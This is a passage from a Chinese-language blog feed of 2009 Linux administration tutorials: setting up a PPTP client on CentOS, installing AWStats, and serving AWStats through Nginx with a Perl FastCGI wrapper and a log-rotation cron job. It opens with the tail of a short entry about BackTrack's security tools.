Linux的集中可能性是无穷的。此外，BackTrack包括广泛的数据库、Web和无缝工具的设置，用于查找和挖掘Linux宣称之外的系统缺陷。它甚至包含内置的HTTP、TFTP、SSH和VNC设备，在漏洞验证和分析期间使用。并且，如果你有这样的需求，BackTrack也能集成数字取证工具。事实上，使用Autopsy和Sleuthkit这样的工具对于“倒回”黑客技术，进一步坚强的你安全技能是很好的。</p><p>　　我一直是使用好的商业安全测试工具的支持者，不过你可能不再使用付费工具。实际上，BackTrack工具不止是够好，她其实非常不错，尤其是精心的报道和正在遭遇漏洞的管理不是你首要考虑的。我将继续在安全评估方面使用商业工具。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>centos 5.2 配置pptp客户端</title>
      <link href="/2009/12/24/centos-5-2-configures-the-pptp-client/"/>
      <url>/2009/12/24/centos-5-2-configures-the-pptp-client/</url>
      <content type="html"><![CDATA[<p>1. 下载源码包</p><p># wget <a href="http://nchc.dl.sourceforge.net/sourceforge/pptpclient/pptp-1.7.2.tar.gz" target="_blank" rel="noopener">http://nchc.dl.sourceforge.net/sourceforge/pptpclient/pptp-1.7.2.tar.gz</a></p><p>2. 编译</p><p># make</p><p>3. 安装</p><p># make install</p><p>4. 配置</p><p># pptpsetup –create tunnelname –server xxx.xxx.xxx.xxx –username somebody –password sercet</p><p>5. 连接</p><p># pppd call tunnelname</p><p>6. 断开</p><p># killall pppd</p><p>注意事项：</p><p>在处理路由的时候采用client to lan方式，需要增加对方lan的路由或者目标网络的路由.</p><p># route add -net 192.168.2.0 netmask 255.255.255.0 dev ppp0</p><p>ppp0是pptp连接的名字， 如果不确定 可以使用ifconfig命令查看</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>awstats的安装</title>
      <link href="/2009/12/24/awstats-installed/"/>
      <url>/2009/12/24/awstats-installed/</url>
      <content type="html"><![CDATA[<p>奇码科技的美国空间是带有详细的统计流量工具awstats，AWStats是一套免费基于Perl的网站日志分析工具。这个工具界面较为友好，执行速度快，扩展功能众多，在国外空间使用apache服务 器的，AWStats是当之无愧的首选。</p><p>[root@webserver ~]# rpm -ivh awstats-6.9-1.noarch.rpm</p><p>error: Failed dependencies:</p><pre><code>perl(LWP::UserAgent) is needed by awstats-6.9-1.noarch</code></pre><p>包依赖关系，需要先安装下面的包</p><p>[root@webserver src]# yum -y install perl-libwww-perl</p><p>Loading “security” plugin</p><p>Loading “rhnplugin” plugin</p><p>This system is not registered with RHN.</p><p>RHN support will be disabled.</p><p>rhel5-local               100% |=========================| 1.3 kB    00:00     </p><p>Setting up Install Process</p><p>Parsing package install arguments</p><p>Resolving Dependencies</p><p>–&gt; Running transaction check</p><p>—&gt; Package perl-libwww-perl.noarch 0:5.805-1.1.1 set to be updated</p><p>–&gt; Processing Dependency: perl(URI::URL) for package: perl-libwww-perl</p><p>–&gt; Processing Dependency: perl(URI) for package: perl-libwww-perl</p><p>–&gt; Processing Dependency: perl(HTML::Entities) for package: perl-libwww-perl</p><p>–&gt; Processing Dependency: perl(Compress::Zlib) for package: perl-libwww-perl</p><p>–&gt; Processing Dependency: perl(URI::Heuristic) for package: perl-libwww-perl</p><p>–&gt; Processing Dependency: perl(URI::Escape) for package: perl-libwww-perl</p><p>–&gt; Processing Dependency: perl-HTML-Parser &gt;= 3.33 for package: perl-libwww-perl</p><p>–&gt; Running transaction check</p><p>—&gt; Package perl-Compress-Zlib.i386 0:1.42-1.fc6 set to be updated</p><p>—&gt; Package perl-URI.noarch 0:1.35-3 set to be updated</p><p>—&gt; Package perl-HTML-Parser.i386 0:3.55-1.fc6 set to be updated</p><p>–&gt; Processing Dependency: perl-HTML-Tagset &gt;= 3.03 for package: perl-HTML-Parser</p><p>–&gt; Processing Dependency: perl(HTML::Tagset) for package: perl-HTML-Parser</p><p>–&gt; Running transaction check</p><p>—&gt; Package perl-HTML-Tagset.noarch 0:3.10-2.1.1 set to be updated</p><p>–&gt; Finished Dependency Resolution</p><p>Dependencies Resolved</p><p>=============================================================================</p><p> Package                 Arch       Version          Repository        Size </p><p>=============================================================================</p><p>Installing:</p><p> perl-libwww-perl        noarch     5.805-1.1.1      rhel5-local       376 k</p><p>Installing for dependencies:</p><p> perl-Compress-Zlib      i386       1.42-1.fc6       rhel5-local        52 k</p><p> perl-HTML-Parser        i386       3.55-1.fc6       rhel5-local        92 k</p><p> perl-HTML-Tagset        noarch     3.10-2.1.1       rhel5-local        14 k</p><p> perl-URI                noarch     1.35-3           rhel5-local       116 k</p><p>Transaction Summary</p><p>=============================================================================</p><p>Install      5 Package(s)         </p><p>Update       0 Package(s)         </p><p>Remove       0 Package(s)         </p><p>Total download size: 651 k</p><p>Downloading Packages:</p><p>Running rpm_check_debug</p><p>Running Transaction Test</p><p>Finished Transaction Test</p><p>Transaction Test Succeeded</p><p>Running Transaction</p><p>  Installing: perl-HTML-Tagset             ######################### [1/5] </p><p>  Installing: perl-HTML-Parser             ######################### [2/5] </p><p>  Installing: perl-URI                     ######################### [3/5] </p><p>  Installing: perl-Compress-Zlib           ######################### [4/5] </p><p>  Installing: perl-libwww-perl             ######################### [5/5] </p><p>Installed: perl-libwww-perl.noarch 0:5.805-1.1.1</p><p>Dependency Installed: perl-Compress-Zlib.i386 0:1.42-1.fc6 perl-HTML-Parser.i386 0:3.55-1.fc6 perl-HTML-Tagset.noarch 0:3.10-2.1.1 perl-URI.noarch 0:1.35-3</p><p>Complete!</p><p>[root@webserver src]# rpm -ivh awstats-6.9-1.noarch.rpm </p><p>Preparing…                ########################################### [100%]</p><p>   1:awstats                ########################################### [100%]</p><p>—– AWStats 6.9 - Laurent Destailleur —–</p><p>AWStats files have been installed in /usr/local/awstats</p><p>If first install, follow instructions in documentation</p><p>(/usr/local/awstats/docs/index.html) to setup AWStats in 3 steps:</p><p>Step 1 : Install and Setup with awstats_configure.pl (or manually)</p><p>Step 2 : Build/Update Statistics with awstats.pl</p><p>Step 3 : Read Statistics</p><p>[root@webserver src]# cd /usr/local/awstats/tools/</p><p>[root@webserver tools]# ./awstats_configure.pl </p><p>—– AWStats awstats_configure 1.0 (build 1.8) (c) Laurent Destailleur —–</p><p>This tool will help you to configure AWStats to analyze statistics for</p><p>one web server. You can try to use it to let it do all that is possible</p><p>in AWStats setup, however following the step by step manual setup</p><p>documentation (docs/index.html) is often a better idea. Above all if:</p><ul><li><p>You are not an administrator user,</p></li><li><p>You want to analyze downloaded log files without web server,</p></li><li><p>You want to analyze mail or ftp log files instead of web log files,</p></li><li><p>You need to analyze load balanced servers log files,</p></li><li><p>You want to ‘understand’ all possible ways to use AWStats…</p></li></ul><p>Read the AWStats documentation (docs/index.html).</p><p>—–&gt; Running OS detected: Linux, BSD or Unix</p><p>—–&gt; Check for web server install</p><p>Enter full config file path of your Web server.</p><p>Example: /etc/httpd/httpd.conf</p><p>Example: /usr/local/apache2/conf/httpd.conf</p><p>Example: c:Program filesapache groupapacheconfhttpd.conf</p><p>Config file path (‘none’ to skip web server setup):</p><blockquote><p>/usr/local/httpd/conf/httpd.conf</p></blockquote><p>—–&gt; Check and complete web server config file ‘/usr/local/httpd/conf/httpd.conf’</p><p>Warning: You Apache config file contains directives to write ‘common’ log files</p><p>This means that some features can’t work (os, browsers and keywords detection).</p><p>Do you want me to setup Apache to write ‘combined’ log files [y/N] ? y</p><p>  Add ‘Alias /awstatsclasses “/usr/local/awstats/wwwroot/classes/“‘</p><p>  Add ‘Alias /awstatscss “/usr/local/awstats/wwwroot/css/“‘</p><p>  Add ‘Alias /awstatsicons “/usr/local/awstats/wwwroot/icon/“‘</p><p>  Add ‘ScriptAlias /awstats/ “/usr/local/awstats/wwwroot/cgi-bin/“‘</p><p>  Add ‘<directory>‘ directive</directory></p><p>  AWStats directives added to Apache config file.</p><p>—–&gt; Need to create a new config file ?</p><p>Do you want me to build a new AWStats config/profile</p><p>file (required if first install) [y/N] ? y</p><p>—–&gt; Define config file name to create</p><p>What is the name of your web site or profile analysis ?</p><p>Example: <a href="http://www.mysite.com" target="_blank" rel="noopener">www.mysite.com</a></p><p>Example: demo</p><p>Your web site, virtual server or profile name:</p><blockquote><p><a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p></blockquote><p>—–&gt; Define config file path</p><p>In which directory do you plan to store your config file(s) ?</p><p>Default: /etc/awstats</p><p>Directory path to store config file(s) (Enter for default):</p><blockquote></blockquote><p>—–&gt; Create config file ‘/etc/awstats/awstats.<a href="http://www.test.com.conf&#39;" target="_blank" rel="noopener">www.test.com.conf&#39;</a></p><p>Error: Failed to open ‘/usr/local/awstats/wwwroot/cgi-bin/awstats.model.conf’ for read.</p><p>/etc/awstats下没有awstats.model.conf文件造成的错误</p><p>[root@webserver tools]# cp /usr/etc/awstats/awstats.model.conf /etc/awstats/</p><p>[root@webserver tools]# ./awstats_configure.pl </p><p>—– AWStats awstats_configure 1.0 (build 1.8) (c) Laurent Destailleur —–</p><p>This tool will help you to configure AWStats to analyze statistics for</p><p>one web server. You can try to use it to let it do all that is possible</p><p>in AWStats setup, however following the step by step manual setup</p><p>documentation (docs/index.html) is often a better idea. Above all if:</p><ul><li><p>You are not an administrator user,</p></li><li><p>You want to analyze downloaded log files without web server,</p></li><li><p>You want to analyze mail or ftp log files instead of web log files,</p></li><li><p>You need to analyze load balanced servers log files,</p></li><li><p>You want to ‘understand’ all possible ways to use AWStats…</p></li></ul><p>Read the AWStats documentation (docs/index.html).</p><p>—–&gt; Running OS detected: Linux, BSD or Unix</p><p>—–&gt; Check for web server install</p><p>Enter full config file path of your Web server.</p><p>Example: /etc/httpd/httpd.conf</p><p>Example: /usr/local/apache2/conf/httpd.conf</p><p>Example: c:Program filesapache groupapacheconfhttpd.conf</p><p>Config file path (‘none’ to skip web server setup):</p><blockquote><p>/usr/local/httpd/conf/httpd.conf</p></blockquote><p>—–&gt; Check and complete web server config file ‘/usr/local/httpd/conf/httpd.conf’</p><p>  All AWStats directives are already present.</p><p>—–&gt; Update model config file ‘/etc/awstats/awstats.model.conf’</p><p>  File awstats.model.conf updated.</p><p>—–&gt; Need to create a new config file ?</p><p>Do you want me to build a new AWStats config/profile</p><p>file (required if first install) [y/N] ? y</p><p>—–&gt; Define config file name to create</p><p>What is the name of your web site or profile analysis ?</p><p>Example: <a href="http://www.mysite.com" target="_blank" rel="noopener">www.mysite.com</a></p><p>Example: demo</p><p>Your web site, virtual server or profile name:</p><blockquote><p><a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p></blockquote><p>—–&gt; Define config file path</p><p>In which directory do you plan to store your config file(s) ?</p><p>Default: /etc/awstats</p><p>Directory path to store config file(s) (Enter for default):</p><blockquote></blockquote><p>—–&gt; Create config file ‘/etc/awstats/awstats.<a href="http://www.test.com.conf&#39;" target="_blank" rel="noopener">www.test.com.conf&#39;</a></p><p> Config file /etc/awstats/awstats.<a href="http://www.test.com.conf" target="_blank" rel="noopener">www.test.com.conf</a> created.</p><p>—–&gt; Add update process inside a scheduler</p><p>Sorry, configure.pl does not support automatic add to cron yet.</p><p>You can do it manually by adding the following command to your cron:</p><p>/usr/local/awstats/wwwroot/cgi-bin/awstats.pl -update -config=<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p><p>Or if you have several config files and prefer having only one command:</p><p>/usr/local/awstats/tools/awstats_updateall.pl now</p><p>Press ENTER to continue… </p><p>A SIMPLE config file has been created: /etc/awstats/awstats.<a href="http://www.test.com.conf" target="_blank" rel="noopener">www.test.com.conf</a></p><p>You should have a look inside to check and change manually main parameters.</p><p>You can then manually update your statistics for ‘<a href="http://www.test.com&#39;" target="_blank" rel="noopener">www.test.com&#39;</a> with command:</p><blockquote><p>perl awstats.pl -update -config=<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p></blockquote><p>You can also read your statistics for ‘<a href="http://www.test.com&#39;" target="_blank" rel="noopener">www.test.com&#39;</a> with URL:</p><blockquote><p><a href="http://localhost/awstats/awstats.pl?config=www.test.com" target="_blank" rel="noopener">http://localhost/awstats/awstats.pl?config=www.test.com</a></p></blockquote><p>Press ENTER to finish…</p><p>[root@webserver tools]# /usr/local/awstats/wwwroot/cgi-bin/awstats.pl –update -config=<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p><p>Error: AWStats database directory defined in config file by ‘DirData’ parameter (/var/lib/awstats) does not exist or is not writable.</p><p>Setup (‘/etc/awstats/awstats.<a href="http://www.test.com.conf&#39;" target="_blank" rel="noopener">www.test.com.conf&#39;</a> file, web server or permissions) may be wrong.</p><p>Check config file, permissions and AWStats documentation (in ‘docs’ directory).</p><p>对于/var/lib/awstats目录没有写入权限造成的</p><p>[root@webserver tools]# chmod 777 /var/lib/awstats</p><p>chmod: cannot access `/var/lib/awstats’: No such file or directory</p><p>[root@webserver tools]# mkdir /var/lib/awstats</p><p>[root@webserver tools]# chmod 777 /var/lib/awstats</p><p>[root@webserver tools]# /usr/local/awstats/wwwroot/cgi-bin/awstats.pl –update -config=<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p><p>Create/Update database for config “/etc/awstats/awstats.<a href="http://www.test.com.conf&quot;" target="_blank" rel="noopener">www.test.com.conf&quot;</a> by AWStats version 6.9 (build 1.925)</p><p>From data in log file “/var/log/httpd/mylog.log”…</p><p>Error: Couldn’t open server log file “/var/log/httpd/mylog.log” : No such file or directory</p><p>Setup (‘/etc/awstats/awstats.<a href="http://www.test.com.conf&#39;" target="_blank" rel="noopener">www.test.com.conf&#39;</a> file, web server or permissions) may be wrong.</p><p>Check config file, permissions and AWStats documentation (in ‘docs’ directory).</p><p>日志路径错位造成的</p><p>[root@webserver tools]# vi /etc/awstats/awstats.<a href="http://www.test.com.conf" target="_blank" rel="noopener">www.test.com.conf</a></p><p>LogFile=”/usr/local/httpd/logs/access_log”</p><p>[root@webserver tools]# /usr/local/awstats/wwwroot/cgi-bin/awstats.pl –update -config=<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p><p>Create/Update database for config “/etc/awstats/awstats.<a href="http://www.test.com.conf&quot;" target="_blank" rel="noopener">www.test.com.conf&quot;</a> by AWStats version 6.9 (build 1.925)</p><p>From data in log file “/usr/local/httpd/logs/access_log”…</p><p>Phase 1 : First bypass old records, searching new record…</p><p>Searching new records from beginning of log file…</p><p>Jumped lines in file: 0</p><p>Parsed lines in file: 30</p><p> Found 0 dropped records,</p><p> Found 30 corrupted records,</p><p> Found 0 old records,</p><p> Found 0 new qualified records.</p><p>从新启动apache</p><p>[root@webserver tools]# /usr/local/httpd/bin/apachectl stop</p><p>[root@webserver tools]# /usr/local/httpd/bin/apachectl start</p><p>添加定时分析指令</p><p>[root@webserver logs]# crontab -e</p><p>20      1       <em>       </em>       *       /usr/local/awstats/wwwroot/cgi-bin/awstats.pl –update -config=<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用awstats 分析 Nginx 的访问日志</title>
      <link href="/2009/12/24/use-awstats-to-analyze-the-access-logs-of-nginx/"/>
      <url>/2009/12/24/use-awstats-to-analyze-the-access-logs-of-nginx/</url>
      <content type="html"><![CDATA[<p>先安装awstats,安装过程在<a href="http://blog.chinaunix.net/u2/71666/showart.php?id=1988397" target="_blank" rel="noopener">http://blog.chinaunix.net/u2/71666/showart.php?id=1988397</a></p><p>完成向导，接下来修改 <a href="http://www.test.cn" target="_blank" rel="noopener">www.test.cn</a> 的统计配置</p><p>[root@test awstats]# pwd</p><p>/etc/awstats</p><p>[root@test awstats]# vi awstats.<a href="http://www.test.com.conf" target="_blank" rel="noopener">www.test.com.conf</a></p><p>找到统计的日志文件的路径</p><p>LogFile=”/var/log/httpd/mylog.log”</p><p>改为</p><p>LogFile=”/usr/local/nginx/logs/test.access_%YYYY-24%MM-24%DD-24.log”</p><p>LogFormat=1</p><p>改为</p><p>LogFormat = “%host %other %logname %time1 %methodurl %code %bytesd %refererquot %uaquot %otherquot”</p><p>[root@test awstats]# cp awstats.<a href="http://www.test.com.conf" target="_blank" rel="noopener">www.test.com.conf</a> awstats.<a href="http://www.good.cn.conf" target="_blank" rel="noopener">www.good.cn.conf</a></p><p>[root@test awstats]# vi awstats.<a href="http://www.good.cn.conf" target="_blank" rel="noopener">www.good.cn.conf</a></p><p>需要注意一下几行</p><p>awstats.<a href="http://www.good.com.conf" target="_blank" rel="noopener">www.good.com.conf</a></p><p>LogFile=”/usr/local/nginx/logs/good.access_%YYYY-24%MM-24%DD-24.log”</p><p>LogFormat = “%host %other %logname %time1 %methodurl %code %bytesd %refererquot %uaquot %otherquot”</p><p>SiteDomain=”<a href="http://www.good.com&quot;" target="_blank" rel="noopener">www.good.com&quot;</a></p><p>HostAliases=”good.com <a href="http://www.good.com" target="_blank" rel="noopener">www.good.com</a> 127.0.0.1 localhost”</p><p>默认编译安装的nginx对cgi的支持并不好(所以在编译的时候一般都没打开这个功能)</p><p>google了一把。大家都用fastcgi来支持。就照搬吧</p><p>[root@test html]# pwd</p><p>/usr/local/nginx/html</p><p>[root@test html]# mkdir cgi-bin</p><p>[root@test html]# cd cgi-bin/</p><p>[root@test cgi-bin]# vi fcgi_perl</p><p>#!/usr/bin/perl -w</p><p>use FCGI;</p><p>use Socket;</p><p>use FCGI::ProcManager;</p><p>sub shutdown { FCGI::CloseSocket($socket); exit; }</p><p>sub restart { FCGI::CloseSocket($socket); &main; }</p><p>use sigtrap ‘handler’, \&amp;shutdown, ‘normal-signals’;</p><p>use sigtrap ‘handler’, \&amp;restart, ‘HUP’;</p><p>require ‘syscall.ph’;</p><p>use POSIX qw(setsid);</p><p>#&daemonize; we don’t daemonize when running under runsv</p><p>#this keeps the program alive or something after exec’ing perl scripts</p><p>END() { }</p><p>BEGIN() { }</p><p>{</p><p>no warnings;</p><p>*CORE::GLOBAL::exit = sub { die “fakeexit\nrc=” . shift() . “\n”; };</p><p>};</p><p>eval q{exit};</p><p>if ($@) {</p><p>exit unless $@ =~ /^fakeexit/;</p><p>}</p><p>&main;</p><p>sub daemonize() {</p><p>chdir ‘/‘ or die “Can’t chdir to /: $!”;</p><p>defined( my $pid = fork ) or die “Can’t fork: $!”;</p><p>exit if $pid;</p><p>setsid() or die “Can’t start a new session: $!”;</p><p>umask 0;</p><p>}</p><p>sub main {</p><p>#如果使用 IP sockets</p><p>#$socket = FCGI::OpenSocket( “127.0.0.1:8999”, 10 );</p><p>#如果使用 UNIX sockets</p><p>#$socket = FCGI::OpenSocket( “/var/run/perl_cgi-dispatch.sock”, 10 );</p><p>#foreach $item (keys %ENV) { delete $ENV{$item}; }</p><p>#设置fastcgi进程数，默认四个</p><p>my $n_processes = $ENV{FCGI_NPROCESSES} || 4;</p><p>$proc_manager = FCGI::ProcManager-&gt;new( {n_processes =&gt; $n_processes} );</p><p>#使用unix socket</p><p>$socket = FCGI::OpenSocket( “$ENV{FCGI_SOCKET_PATH}”, 10 );</p><p>#设置Socket权限</p><p>chmod 0777, $ENV{FCGI_SOCKET_PATH};</p><p>; #use UNIX sockets - user running this script must have w access to the ‘nginx’ folder!!</p><p>$request =</p><p>FCGI::Request( \*STDIN, \*STDOUT, \*STDERR, \%req_params, $socket,</p><p>&amp;FCGI::FAIL_ACCEPT_ON_INTR );</p><p>$proc_manager-&gt;pm_manage();</p><p>if ($request) { request_loop() }</p><p>FCGI::CloseSocket($socket);</p><p>}</p><p>sub request_loop {</p><p>while ( $request-&gt;Accept() &gt;= 0 ) {</p><p>$proc_manager-&gt;pm_pre_dispatch();</p><p>#processing any STDIN input from WebServer (for CGI-POST actions)</p><p>$stdin_passthrough = ‘’;</p><p>{ no warnings; $req_len = 0 + $req_params{‘CONTENT_LENGTH’}; };</p><p>if ( ( $req_params{‘REQUEST_METHOD’} eq ‘POST’ ) &amp;&amp; ( $req_len != 0 ) )</p><p>{</p><p>my $bytes_read = 0;</p><p>while ( $bytes_read &lt; $req_len ) {</p><p>my $data = ‘’;</p><p>my $bytes = read( STDIN, $data, ( $req_len - $bytes_read ) );</p><p>last if ( $bytes == 0 || !defined($bytes) );</p><p>$stdin_passthrough .= $data;</p><p>$bytes_read += $bytes;</p><p>}</p><p>}</p><p>#running the cgi app</p><p>if (</p><p>( -x $req_params{SCRIPT_FILENAME} ) &amp;&amp; #can I execute this?</p><p>( -s $req_params{SCRIPT_FILENAME} ) &amp;&amp; #Is this file empty?</p><p>( -r $req_params{SCRIPT_FILENAME} ) #can I read this file?</p><p>)</p><p>{</p><p>pipe( CHILD_RD, PARENT_WR );</p><p>pipe( PARENT_ERR, CHILD_ERR );</p><p>my $pid = open( CHILD_O, “-|” );</p><p>unless ( defined($pid) ) {</p><p>print(“Content-type: text/plain\r\n\r\n”);</p><p>print</p><p>“Error: CGI app returned no output - Executing $req_params{SCRIPT_FILENAME} failed !\n”;</p><p>next;</p><p>}</p><p>$oldfh = select(PARENT_ERR);</p><p>$| = 1;</p><p>select(CHILD_O);</p><p>$| = 1;</p><p>select($oldfh);</p><p>if ( $pid &gt; 0 ) {</p><p>close(CHILD_RD);</p><p>close(CHILD_ERR);</p><p>print PARENT_WR $stdin_passthrough;</p><p>close(PARENT_WR);</p><p>$rin = $rout = $ein = $eout = ‘’;</p><p>vec( $rin, fileno(CHILD_O), 1 ) = 1;</p><p>vec( $rin, fileno(PARENT_ERR), 1 ) = 1;</p><p>$ein = $rin;</p><p>$nfound = 0;</p><p>while ( $nfound =</p><p>select( $rout = $rin, undef, $ein = $eout, 10 ) )</p><p>{</p><p>die “$!” unless $nfound != -1;</p><p>$r1 = vec( $rout, fileno(PARENT_ERR), 1 ) == 1;</p><p>$r2 = vec( $rout, fileno(CHILD_O), 1 ) == 1;</p><p>$e1 = vec( $eout, fileno(PARENT_ERR), 1 ) == 1;</p><p>$e2 = vec( $eout, fileno(CHILD_O), 1 ) == 1;</p><p>if ($r1) {</p><p>while ( $bytes = read( PARENT_ERR, $errbytes, 4096 ) ) {</p><p>print STDERR $errbytes;</p><p>}</p><p>if ($!) {</p><p>$err = $!;</p><p>die $!;</p><p>vec( $rin, fileno(PARENT_ERR), 1 ) = 0</p><p>unless ( $err == EINTR or $err == EAGAIN );</p><p>}</p><p>}</p><p>if ($r2) {</p><p>while ( $bytes = read( CHILD_O, $s, 4096 ) ) {</p><p>print $s;</p><p>}</p><p>if ( !defined($bytes) ) {</p><p>$err = $!;</p><p>die $!;</p><p>vec( $rin, fileno(CHILD_O), 1 ) = 0</p><p>unless ( $err == EINTR or $err == EAGAIN );</p><p>}</p><p>}</p><p>last if ( $e1 || $e2 );</p><p>}</p><p>close CHILD_RD;</p><p>close PARENT_ERR;</p><p>waitpid( $pid, 0 );</p><p>} else {</p><p>foreach $key ( keys %req_params ) {</p><p>$ENV{$key} = $req_params{$key};</p><p>}</p><p># cd to the script’s local directory</p><p>if ( $req_params{SCRIPT_FILENAME} =~ /^(.*)\/[^\/]+$/ ) {</p><p>chdir $1;</p><p>}</p><p>close(PARENT_WR);</p><p>#close(PARENT_ERR);</p><p>close(STDIN);</p><p>close(STDERR);</p><p>#fcntl(CHILD_RD, F_DUPFD, 0);</p><p>syscall( &amp;SYS_dup2, fileno(CHILD_RD), 0 );</p><p>syscall( &amp;SYS_dup2, fileno(CHILD_ERR), 2 );</p><p>#open(STDIN, “&lt;&amp;CHILD_RD”);</p><p>exec( $req_params{SCRIPT_FILENAME} );</p><p>die(“exec failed”);</p><p>}</p><p>} else {</p><p>print(“Content-type: text/plain\r\n\r\n”);</p><p>print</p><p>“Error: No such CGI app - $req_params{SCRIPT_FILENAME} may not exist or is not executable by this process.\n”;</p><p>}</p><p>}</p><p>}</p><p>再设置启动的脚本</p><p>[root@test cgi-bin]# vi startfcgiperl</p><p>export FCGI_SOCKET_PATH=”/tmp/perl_fcgi.socket”</p><p>export FCGI_NPROCESSES=4</p><p>./fcgi_perl &amp;</p><p>然后加上执行权限</p><p>[root@test cgi-bin]# chmod +x fcgi_perl startfcgiperl </p><p>[root@test cgi-bin]# perl -MCPAN -e shell       </p><p>cpan&gt; install FCGI</p><p>cpan&gt; install FCGI::ProcManager</p><p>[root@test cgi-bin]# ./startfcgiperl &amp;</p><p>为nginx添加fastCGI的perl支持</p><p>[root@test conf]# pwd</p><p>/usr/local/nginx/conf</p><p>[root@test conf]# vi gzip.conf</p><p>#!nginx (-)</p><p># gzip.conf</p><p>gzip on;</p><p>gzip_min_length 1100;</p><p>gzip_buffers 4 8k;</p><p>gzip_types text/plain;</p><p>output_buffers 1 32k;</p><p>postpone_output 1460;</p><p>[root@test conf]# vi proxy.conf</p><p>#!nginx (-)</p><p># proxy.conf</p><p>proxy_redirect off;</p><p>proxy_set_header Host $http_host;</p><p>proxy_set_header X-Real-IP $remote_addr;</p><p>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</p><p>client_max_body_size 10m;</p><p>client_body_buffer_size 128k;</p><p>proxy_connect_timeout 90;</p><p>proxy_send_timeout 90;</p><p>proxy_read_timeout 90;</p><p>proxy_buffers 32 4k;</p><p>[root@test conf]# vi awstats.conf</p><p>fastcgi_pass unix:/tmp/perl_fcgi.socket;</p><p>fastcgi_index awstats.pl;</p><p>fastcgi_param SCRIPT_FILENAME /usr/local/awstats/wwwroot/cgi-bin/awstats.pl;</p><p>fastcgi_param QUERY_STRING $query_string;</p><p>fastcgi_param REQUEST_METHOD $request_method;</p><p>fastcgi_param CONTENT_TYPE $content_type;</p><p>fastcgi_param CONTENT_LENGTH $content_length;</p><p>fastcgi_param GATEWAY_INTERFACE CGI/1.1;</p><p>fastcgi_param SERVER_SOFTWARE nginx;</p><p>fastcgi_param SCRIPT_NAME $fastcgi_script_name;</p><p>fastcgi_param REQUEST_URI $request_uri;</p><p>fastcgi_param DOCUMENT_URI $document_uri;</p><p>fastcgi_param DOCUMENT_ROOT $document_root;</p><p>fastcgi_param SERVER_PROTOCOL $server_protocol;</p><p>fastcgi_param REMOTE_ADDR $remote_addr;</p><p>fastcgi_param REMOTE_PORT $remote_port;</p><p>fastcgi_param SERVER_ADDR $server_addr;</p><p>fastcgi_param SERVER_PORT $server_port;</p><p>fastcgi_param SERVER_NAME $server_name;</p><p>fastcgi_read_timeout 60;</p><p>[root@test conf]# vi nginx.conf</p><p>user nobody;</p><p>worker_processes 2;</p><p>events {</p><pre><code>use epoll;worker_connections 2048;</code></pre><p>}</p><p>http {</p><pre><code>include mime.types;default_type application/octet-stream;access_log logs/access.log;sendfile on;tcp_nodelay on;keepalive_timeout 65;include      gzip.conf;log\_format test    &apos;$remote\_addr - $remote\_user [$time\_local] &quot;$request&quot; &apos;                  &apos;$status $body\_bytes\_sent &quot;$http_referer&quot; &apos;                  &apos;&quot;$http\_user\_agent&quot; &quot;$http\_x\_forwarded_for&quot;&apos;;log\_format good    &apos;$remote\_addr - $remote\_user [$time\_local] &quot;$request&quot; &apos;                  &apos;$status $body\_bytes\_sent &quot;$http_referer&quot; &apos;                  &apos;&quot;$http\_user\_agent&quot; &quot;$http\_x\_forwarded_for&quot;&apos;;</code></pre><p>server</p><pre><code>{    listen 80;    server_name www.test.com test.com;access_log logs/test.access.log test;location ~ ^/NginxStatus/ {stub_status on;access_log off; } location ~ ^/(WEB-INF)/ { deny all; }location ~ \\.(htm|html|gif|jpg|jpeg|png|bmp|ico|rar|css|js|zip|java|jar|txt|flv|swf|mid|doc|ppt|xls|pdf|txt|mp3|wma)$ {        root /projects/test; expires 24h;    }    location ~* .*\\.pl${include awstats.conf;}location /awstatsicon/{   alias /usr/local/awstats/wwwroot/icon/;}location /{proxy_pass http://localhost:8080;include proxy.conf;}    error_page 404 /html/404.html;error_page 502 503 /html/502.html;    error_page 500 504 /50x.html;    location = /50x.html {        root html;}}</code></pre><p>server</p><pre><code>{listen 80;    server_name www.good.cn good,cn www.good.net good.net;access_log logs/good.access.log good;     location ~ ^/(WEB-INF)/ {        deny all;     }    location ~ \\.(htm|html|gif|jpg|jpeg|png|bmp|ico|rar|css|js|zip|java|jar|txt|flv|swf|mid|doc|ppt|xls|pdf|txt|mp3|wma)$ {        root /projects/good;         expires 24h;    }    location ~* .*\\.pl$    {    include awstats.conf;    }    location /awstatsicon/    {    alias /usr/local/awstats/wwwroot/icon/;    }    location /{    proxy_pass http://localhost:8080;    include proxy.conf;    }    error_page 404 /html/404.html;    error_page 502 503 /html/502.html;    error_page 500 504 /50x.html;    location = /50x.html {        root html;    }}</code></pre><p>}</p><p>配置Nginx自动切割日志</p><p>跟 Apache HTTP Server（以下称 Apache）不同的是，Apache 可以将日志输出通过管道的方式进行重新定向，依此来进行自动的日志切割。Nginx 在现今版本上还没能跟 Apache 一样，通过%YY等参数按日期分批创建日志，但是通过给 nginx 进程发送一个特定的信号，可以使 nginx 重新生成日志文件。我们可以定期执行一个 Shell 脚本来切换日志，重新命名或转移，具体的脚本如下：</p><p>[root@test sbin]# pwd</p><p>/usr/local/nginx/sbin</p><p>[root@test sbin]# more logcron.sh</p><p>mv /usr/local/nginx/logs/test.access.log /usr/local/nginx/logs/test.access_`date +%Y%m%d`.log</p><p>mv /usr/local/nginx/logs/good.access.log /usr/local/nginx/logs/good.access_`date +%Y%m%d`.log</p><p>killall –s USR1 nginx</p><p>[root@test sbin]# crontab -e</p><p>59    23    <em>    </em>    *    /usr/local/nginx/sbin/logcron.sh</p><p>20    2    <em>    </em>    *    /usr/local/awstats/tools/awstats_updateall.pl now -awstatsprog=/usr/local/awstats/wwwroot/cgi-bin/awstats.pl</p><p>然后可以通过<a href="http://www.test.com/awstats.pl" target="_blank" rel="noopener">http://www.test.com/awstats.pl</a></p><p><a 